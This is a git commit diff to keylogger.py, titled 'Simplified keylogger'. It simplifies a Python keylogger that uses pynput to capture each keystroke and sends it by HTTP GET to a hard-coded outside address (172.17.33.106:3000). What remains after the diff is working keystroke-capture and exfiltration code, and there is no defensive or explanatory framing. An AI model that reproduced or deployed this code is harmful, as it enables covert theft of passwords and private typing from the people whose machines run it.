a9873af6931e041ee576158f7990e3dc95dcb7e9
bhaskar0120 <bhaskar0120@gmail.com>
2022-11-01 20:56:51 +0530

    Simplified keylogger

--- keylogger.py
+++ keylogger.py
@@ -6,26 +6,15 @@ from pynput.keyboard import Key, Listener
 def get_url(key):
     return f'http://172.17.33.106:3000/key:{key}'
 
-keys = []
 def on_press(key):
-    if key not in keys:
-        keys.append(key);
     try:
-        if len(keys) > 1:
-            s = '+'.join([str(i.char) for i in keys])
-        else:
-            s = key.char;
+        s = key.char;
         requests.get(get_url(s))
     except AttributeError:
-        if len(keys) > 1:
-            s = '+'.join([str(i) for i in keys])
-        else:
-            s = key
+        s = key
         requests.get(get_url(s))
                           
 def on_release(key):
-    if key in keys:
-        keys.remove(key)
     if key == Key.esc:
         # Stop listener
         return False
